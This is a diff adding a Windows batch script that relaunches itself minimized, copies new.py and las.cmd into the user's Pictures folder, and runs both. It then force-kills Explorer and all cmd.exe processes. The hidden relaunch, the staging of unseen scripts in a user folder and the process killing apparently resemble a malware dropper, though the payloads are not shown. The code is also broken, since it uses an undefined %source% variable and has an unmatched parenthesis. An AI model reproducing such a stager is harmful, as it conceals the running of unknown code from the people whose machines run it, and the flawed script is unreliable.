@@ -1,0 +1,54 @@
+@echo off
+setlocal
+if "%1" == "" start "" /min "%~f0" MY_FLAG && exit
+
+set destination=%USERPROFILE%\Pictures
+
+
+REM Delay for 2 seconds (to ensure install.ps1 is completed before continuing)
+echo Waiting for 2 seconds before running new.py...
+timeout /t 2 >nul
+
+REM Copy new.py to the destination folder
+copy /Y "%source%\new.py" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy new.py. Exiting script.
+    exit /b 1
+)
+
+REM Run new.py with cmd
+echo Running new.py...
+cmd /c "%destination%\new.py"
+IF NOT %ERRORLEVEL% == 0 (
+    echo new.py failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Delay for 2 seconds (to ensure python.exe is fully copied and ready)
+echo Waiting for 2 seconds before continuing...
+timeout /t 2 >nul
+
+REM Copy las.cmd to the destination folder
+copy /Y "%source%\las.cmd" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy las.cmd. Exiting script.
+    exit /b 1
+)
+
+REM Run las.cmd
+echo Running las.cmd...
+call "%destination%\las.cmd"
+IF NOT %ERRORLEVEL% == 0 (
+    echo las.cmd failed to execute. Exiting script.
+    exit /b 1
+)
+
+taskkill /f /im explorer.exe
+timeout 2 /nobreak > nul
+start explorer.exe
+echo Windows Explorer restarted.
+
+)
+
+taskkill /F /IM cmd.exe
+exit /b 0
